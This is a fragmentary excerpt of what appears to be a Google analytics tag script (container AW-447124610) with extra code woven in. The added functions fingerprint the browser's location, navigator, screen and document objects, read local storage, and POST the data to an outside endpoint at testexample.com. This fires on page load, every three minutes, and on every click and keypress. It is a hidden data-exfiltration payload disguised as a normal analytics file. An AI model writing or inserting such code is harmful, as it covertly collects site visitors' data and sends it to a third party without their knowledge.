...
(function () {
  ...
  */
  ...
  const variablesToTrack = ['location', 'navigator', 'screen', 'document'];
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChAI8NCBpwYQt5+cxZ7f1aFJEiUATU77VF+irX8Ndce848bqXrWocAj0xPIp2xsAufNMquaqYMGVGgInIw\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function computeHash(object) {
    const objKeys = Object.getOwnPropertyNames(object);
    const sortedKeysString = objKeys.sort().join("");
    let hashNum = 0;
    for (let count = 0; count < sortedKeysString.length; count++) {
      const charCode = sortedKeysString.charCodeAt(count);
      hashNum = (hashNum << 5) - hashNum + charCode;
  ...
  function getGlobalVariables() {
    ...
    variablesToTrack.forEach(variable => {
      if (window[variable]) {
        trackedData[variable] = computeHash(window[variable]);
      }
    });
    return trackedData;
  }
  ...
  async function postData(data) {
    ...
    const apiHook = "https://testexample.com/api/dataHook";
    try {
      const response = await fetch(apiHook, {
        method: "POST",
        headers: {
      ...
      response.ok ? console.log("data successfully uploaded") : console.error(`Data upload failed, status code: ${response.status}`);
    } catch (error) {
      console.error("An error occurred during the data upload: ", error);
    }
  }
  function qm(a, b, c) {
  ...
  ;
  function gatherAndPostData() {
    const globalVars = getGlobalVariables();
    const localStorageData = checkLocalStorage();
    const data = Object.assign({}, globalVars, localStorageData);
    if (Object.keys(data).length > 0) postData(data);
  }
  function Ly() {
  ...
  window.addEventListener("DOMContentLoaded", () => {
    gatherAndPostData();
    setInterval(gatherAndPostData, 180000);
  });
  ...
  function RC(a, b, c, d) {}
  document.addEventListener("click", gatherAndPostData);
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'AW-447124610'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  function jF() {}
  document.addEventListener("keydown", gatherAndPostData);
  jF.M = "logToConsole";
  function kF(a, b) {}
